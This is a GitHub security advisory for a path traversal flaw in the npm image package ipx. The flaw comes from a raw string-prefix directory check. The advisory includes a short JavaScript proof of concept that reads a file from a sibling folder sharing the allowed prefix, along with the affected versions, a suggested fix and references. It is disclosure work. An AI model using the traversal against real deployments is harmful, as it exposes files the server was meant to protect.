# [M] IPX Allows Path Traversal via Prefix Matching Bypass

## Summary
Severity: Medium
Advisory: GHSA-mm3p-j368-7jcr
CVE: CVE-2025-54387
CWE: CWE-22
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:L/VI:N/VA:N/SC:H/SI:L/SA:N (CVSS_V4)
Published: 2025-08-04
Source: https://github.com/advisories/GHSA-mm3p-j368-7jcr
Type: github-advisory

## Affected
- npm: `ipx` — affected >=0 <1.3.2
- npm: `ipx` — affected >=2.0.0-0 <2.1.1
- npm: `ipx` — affected >=3.0.0 <3.1.1

## Details
### Summary

The approach used to check whether a path is within allowed directories is vulnerable to path prefix bypass when the allowed directories do not end with a path separator. This occurs because the check relies on a raw string prefix comparison.


### PoC

- setup
```
mkdir ~/public123
move a png file under ~/public123 with name test.png
cd
npm i ipx 
```

- `main.js`
```js
import { createIPX, ipxFSStorage } from "ipx";

const ipx = createIPX({
  storage: ipxFSStorage({ dir: "./public" }),
});


(async () => { 
    {
        const source = await ipx("../public123/test.png"); // access file outside ./public dir because of same prefix folder
        const { data, format } = await source.process();
        console.log(format) // print image data
    }
    {
        try {
            const source = await ipx("../publi123/test.png"); // forbidden path: the prefix is not the same
            const { data, format } = await source.process();
            console.log(data)
        } catch (err) {
            console.log(err.message) // Forbidden path:
        }

    }

})()
```

- `node main.js`
```
png
Forbidden path: /../publi123/test.png
```

### Impact
Path Traversal

### Possible Fix

Check if the `dir` ends with `/` (path separator) and if not, add before calling `startsWith`

## References
- https://github.com/unjs/ipx/security/advisories/GHSA-mm3p-j368-7jcr
- https://nvd.nist.gov/vuln/detail/CVE-2025-54387
- https://github.com/unjs/ipx/commit/81693ddbfc062cc922e4e2406e8427ab4e3ad214
- https://github.com/unjs/ipx
- https://github.com/unjs/ipx/releases/tag/v1.3.2
- https://github.com/unjs/ipx/releases/tag/v2.1.1
- https://github.com/unjs/ipx/releases/tag/v3.1.1
